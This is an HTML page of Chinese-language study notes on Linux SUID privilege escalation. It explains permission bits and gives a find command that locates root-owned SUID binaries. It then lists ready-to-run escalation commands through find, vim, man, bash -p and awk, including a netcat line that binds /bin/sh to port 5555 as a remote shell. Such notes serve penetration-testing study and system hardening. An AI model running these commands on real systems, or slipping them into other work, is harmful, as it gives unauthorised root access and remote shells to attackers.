<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title># suid提权,suid提权</title>
    <link rel="stylesheet" href="/assets/css/notes.min.css">
</head>
<body>
    <div class="main-content-wrapper">
        <main class="content">
            <h1>suid提权</h1>
<h2>1.简介</h2>
<p>当使用ll 命令来查看文件或者目录权限时，第一列一共有 10 个字符长度，从右往左编号，即 9876543210，其中：</p>
<ul>
<li>9 共 1 位表示标识位：标识当前的文件类型。如 d 表示目录，- 表示普通文件；</li>
<li>876 共 3 位表示 属主 的权限；</li>
<li>543 共 3 位表示 组用户 的权限；</li>
<li>210 共 3 位表示 其他用户 的权限</li>
</ul>
<p>但实际上Linux 表示文件或者目录的权限，总共用了 12 个比特位</p>
<p>除了3个3位的权限，Linux 还有 3 个比特位来表示 <code>SUID</code> 、<code>SGID</code> 和 <code>SBIT</code> 等特殊权限：</p>
<ul>
<li><code>SUID</code> 表示 <code>Set User IDentification</code>，出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限</li>
<li><code>SGID</code> 不仅可以用来控制文件权限，还能控制目录的权限</li>
<li><code>SBIT</code> 只能用来控制目录的权限，不能用来控制文件</li>
</ul>
<h2>2.查找有 SUID 权限位文件</h2>
<p>从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null</p>
<pre><code class="language-shell">find / -user root -perm -4000 -print 2&gt;/dev/null
</code></pre>
<h2>3.常用方式</h2>
<h3>3.1 find</h3>
<pre><code class="language-shell">touch test
find test -exec netcat -lvp 5555 -e /bin/sh \;
</code></pre>
<h3>3.2 vi/vim</h3>
<p>打开vim,按下ESC</p>
<pre><code class="language-shell">:set shell=/bin/sh
:shell
</code></pre>
<h3>3.3 man</h3>
<pre><code class="language-shell">man passwd
!/bin/bash
</code></pre>
<h3>3.4 bash</h3>
<pre><code class="language-shell">bash -p
bash-3.2# id
</code></pre>
<h3>3.5 awk</h3>
<pre><code class="language-shell">awk 'BEGIN {system(&quot;/bin/bash&quot;)}'
</code></pre>

        </main>
    </div>
</body>
</html>